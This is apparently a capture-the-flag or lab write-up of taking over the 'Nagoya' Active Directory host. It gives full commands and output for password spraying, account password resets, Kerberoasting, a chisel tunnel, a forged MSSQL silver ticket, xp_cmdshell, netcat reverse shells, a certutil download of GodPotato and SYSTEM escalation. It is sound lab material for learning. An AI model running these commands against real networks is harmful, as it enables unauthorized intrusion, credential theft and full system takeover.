##### Tags: `chisel`  `port forwarding`  `password spraying`  `Kerberoasting`  `mssql`  `SeImpersonatePrivilege`  `bloodhound`

# 🪟 Nagoya (AD)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.162.21 

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-10 11:56:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```
# AD machine
port 135,139,445 rpc smb unable to connect with no credential  
port 80 we found a bunch of username in http://192.168.125.21/Team  
save all username to 1.txt then use username-anarchy to make bunch of combination  
```console
./username-anarchy --input-file 1.txt > usernames1.txt
```
the website is created in 2023 - Nagoya  
we make a password file using the name and season
```console
$ cat pass.txt                            
Nagoya2023
Spring2023
Summer2023
Autumn2023
Winter2023
```
use nxc to password spraying the smb service
```console
$ nxc smb 192.168.125.21 -u usernames1.txt -p pass.txt --continue-on-success
```
we found 3 vaild user and password
```console
SMB         192.168.125.21  445    NAGOYA           [+] nagoya-industries.com\andrea.hayes:Nagoya2023 
SMB         192.168.125.21  445    NAGOYA           [+] nagoya-industries.com\craig.carr:Spring2023
SMB         192.168.125.21  445    NAGOYA           [+] nagoya-industries.com\fiona.clark:Summer2023 
```
use bloodhound-python to create a json file for bloodhound
```console
bloodhound-python -d nagoya-industries.com -u 'andrea.hayes' -p 'Nagoya2023' -ns 192.168.162.21 -c all
```
in bloodhound we found andrea.hayes can change password of svc_helpdesk  
svc_helpdesk can change password of christopher.lewis  
christopher.lewis has access for remote login   
so we change the password of svc_helpdesk 
```console
$ rpcclient 192.168.125.21 -U 'andrea.hayes'                      
Password for [WORKGROUP\andrea.hayes]: Nagoya2023
rpcclient $> setuserinfo2 svc_helpdesk 23 Password123
```
login as svc_helpdesk and change the password of christopher.lewis 
```console
$ rpcclient 192.168.125.21 -U 'svc_helpdesk'                      
Password for [WORKGROUP\svc_helpdesk]: Password123
rpcclient $> setuserinfo2 christopher.lewis 23 Password123
```
login as christopher.lewis
```console
$ evil-winrm -i 192.168.125.21 -u christopher.lewis -p Password123                                     
Evil-WinRM shell v3.7
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> whoami

nagoya-ind\christopher.lewis
```
since we have credential we also do Kerberoasting  
found the hash for svc_mssql

```console
$ impacket-GetUserSPNs -request -dc-ip 192.168.162.21 nagoya-industries.com/andrea.hayes
Password: Nagoya2023

$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*$c9d2eb8d19f77fe127e54da947f7535e$1e22e82a66145922e5f641d121b32dc3b87c7a9b61c54f82402e56d5481e97509042499eb68f3eb110dcf64afbf8924829a7e319a48f38be91eaa883e9c574b544ef08477837362dc29afa563581f4756399419a94bba6ccd0ccc8e74e86d4b51c87d18840b30df5804a630e2386ea5fc93b2a07a21c726d2ad0060c07c07b04f90101408b044e6704e624e3cd7e1ce740977da3bb898816b41ff650d1e2b06f762156002b548edc8e1dcb59e8eee73e3f94f5ff0e03e261c60dcba4b6a9922381fe8715b6db398b663d5b2587d872a5a455972a3e1ebfed0395c7585026f7814cd22c9973fb48482640f4ba3c757921988d5b9648df3a0dbabd52302760667d22b631cbe310398e7b189af9eee98dc8d1f0de96944806ff9bcbebef2e26727e125ebdb797b1fa4cb5b715fe8fe8bc53ac706cb6f9078ac83d05e09938a6777960102764bf24f3609f99b3b00bb761d77ea1769857c8d0e0ceedbf2c2ddbf6de1ae843a79826e8ad1f72d0da54421cc076a7c24b0c2f3b43338c2379e5a0908f7ecf33a863a28da6aafb511a244f1cd7844c7867565010f110a20ba7cd029b474b3c9ec3f201d0557fb7581028f5de2fe34b6034747910b62d64066cd5548104383a574aa86b9c8d9ff23f0956ed3c737d016e2ae3868509bb13cdd4bd81bbc13f9553abd7cd08fb8f1cecd2f5bae73945d64fbe0d548f9b60c0f7d64c3111c16a65a8f3d7d893bb1a83253c8d7bb469cc6d0dd965a67bef92138ff7f3ffd5b2929d1c394a8d05cf9e6f4b5b14640ae15cdb63abbdf71234a32412dbd4f297c26a0b5565e5181c00b6a7c92ed1ebecd0ad1c3957b7e822571f3d1ba6d2194319d84dea40078a5386b2d9d15e4f2bca68b622efe7ec10b95154642cc8776a9ccdb8411eaa4db0c1d718b4da608b81178d143278e9cabed28b94a1ba4b37e7867fce25a2a1b0ebe06a665899134258c971e58325acef7beab3bf4dc7fb3d65a690598e6c9055a42a057fa13fd89d68f03b7d57673f2b7b723982e1147c4b4e825626d16d3e6ec3e0a7b113ed434cce1c4afd866c01a27b97bb68435f6a2a130a4bc3daaabd49c71ccd03a5b9861cf3c0a12d4b4a6c8024d5264b00f354039863a0c8addbe4e7cc9cbbf792b663476fce5c5fe72f8ec6401e95207238180192e7dadac70c640a0faee6a2315aed5c711cc6042463e0c58c64edd9c2241271e2ffed29963a0ebcbd012b8cd61c902aa32576b598ab682472d3384c6eb8d0990208f944affb0b40de06fac148ea850fff0e8f540241ba7b221ef5a09ed5987f4292aeb507bd0e4882a085cc207078691a64f7601046439d62a36b3f986bf9c722528ee260f61d4314975c12b05c606dde7be47124f149706936400227abce12375f21804b0c68588c1792524809508746d34617091a6d0cd9deae97222054f8998ce30dabaf25670857e01a96abe12d0777b2233f8963449568f6020d0f6d36155b578bdc4423bcb19d660e17333a32b648395c02be52468b42b639aa81eaad97a6f4d13b2b96d9871d1318896ada12ad4efef94d10a382adbd79d4c4aae6c3e574c64d6828542bb56f771baae1672b368b0e055443f52faaa80b0ff7bf249c2bb7b94cd714b4c1a9d53a028c
```
crack it and got the password Service1
```console
hashcat -m 13100 1.txt /home/ming/Downloads/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
Service1
```
we found there is a mssql service running locally
```console
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents>  netstat -ano | findstr 1433
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       4372
  TCP    [::]:1433              [::]:0                 LISTENING       4372
```
we want to port forwarding to mssql service  
```console
#Kali

$ chisel server -p 555 --reverse    
2026/04/11 22:13:30 server: Reverse tunnelling enabled
2026/04/11 22:13:30 server: Fingerprint n5Q5fmqh1Ni0WlxF1xv0bxqMUO+X7gTDXqXGHVCGBF4=
2026/04/11 22:13:30 server: Listening on http://0.0.0.0:555
```
```console
# Windows target

*Evil-WinRM* PS C:\Temp> .\chisel.exe client 192.168.45.224:555 R:1433:127.0.0.1:1433
chisel.exe : 2026/04/11 05:14:16 client: Connecting to ws://192.168.45.224:555
    + CategoryInfo          : NotSpecified: (2026/04/11 05:1....168.45.224:555:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/04/11 05:14:17 client: Connected (Latency 99.0412ms)


2026/04/11 22:14:22 server: session#1: tun: proxy#R:1433=>1433: Listening
```
login with mssqlcient now and found we dont have permission
```console
$ impacket-mssqlclient nagoya-industries.com/svc_mssql:'Service1'@127.0.0.1 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (NAGOYA-IND\svc_mssql  guest@master)> RECONFIGURE;
ERROR(nagoya\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
```
We may forge a silver ticket to attempt to escalate to a more privileged account  
we need three things for this attack  
```console
1. NTLM hash of the user converter
https://www.browserling.com/tools/ntlm-hash
```
```console
2. SPN
*Evil-WinRM* PS C:\Temp> setspn -L svc_mssql
Registered ServicePrincipalNames for CN=svc_mssql,CN=Users,DC=nagoya-industries,DC=com:

        MSSQL/nagoya.nagoya-industries.com
```
```console
3. SID number

*Evil-WinRM* PS C:\Temp> Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames

SID                   : S-1-5-21-1969309164-1513403977-1686805993-1136
```
create a ticket of administrator
```console
impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for nagoya-industries.com/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
create a /etc/krb5user.conf
```console
$ cat /etc/krb5user.conf
[libdefaults]
    default_realm = NAGOYA-INDUSTRIES.COM
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false
    dns_canonicalize_hostname = false

[realms]
    NAGOYA-INDUSTRIES.COM = {
        kdc = nagoya.nagoya-industries.com
    }

[domain_realm]
    .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
    nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```
add nagoya.nagoya-industries.com to 127.0.0.1 /etc/hosts
```console
127.0.0.1  nagoya-industries.com nagoya.nagoya-industries.com
```
login again using the ticket
```console
$ impacket-mssqlclient -k nagoya.nagoya-industries.com -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (NAGOYA-IND\Administrator  dbo@master)> RECONFIGURE;
SQL (NAGOYA-IND\Administrator  dbo@master)> enable_xp_cmdshell
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami
output                 
--------------------   
nagoya-ind\svc_mssql   

NULL           
```
We got RCE upload nc get the shell
```console
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell C:\Temp\nc.exe -e cmd.exe 192.168.45.224 139
```
svc_mssql
```console
$ penelope -p 139
[+] Listening for reverse shells on 0.0.0.0:139 →  127.0.0.1 • 10.0.2.15 • 192.168.45.224
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from NAGOYA 192.168.125.21 Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC 👤 nagoya-ind\svc_mssql • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/NAGOYA~192.168.125.21-Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC/2026_04_11-23_13_34-732.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami

nagoya-ind\svc_mssql
```
## Privilege Escalation
we now got a lot of privilege to abuse  
```console
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 

```
i chose SeImpersonatePrivilege  
upload godpotato  
```console
C:\Temp>certutil -urlcache -f http://192.168.45.224:80/GodPotato-NET4.exe GodPotato-NET4.exe
certutil -urlcache -f http://192.168.45.224:80/GodPotato-NET4.exe GodPotato-NET4.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
run and get the system shell
```console
C:\Temp>GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.224 4141"
GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.224 4141"
[*] CombaseModule: 0x140730437533696
[*] DispatchTable: 0x140730439843968
[*] UseProtseqFunction: 0x140730439219744
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\283cb9ba-7ac9-4541-8cb1-a25676f5952a\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000b002-0aac-ffff-aa67-49404d58a247
[*] DCOM obj OXID: 0x2acefeaef5def7f8
[*] DCOM obj OID: 0xe1498d9300fec2fc
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 880 Token:0x800  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 708
```
```console
$ penelope -p 4141         
[+] Listening for reverse shells on 0.0.0.0:4141 →  127.0.0.1 • 10.0.2.15 • 192.168.45.224
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from NAGOYA 192.168.125.21 Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC 👤 nt authority\system • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/NAGOYA~192.168.125.21-Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC/2026_04_11-18_27_05-040.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Temp>whoami
whoami
nt authority\system
```
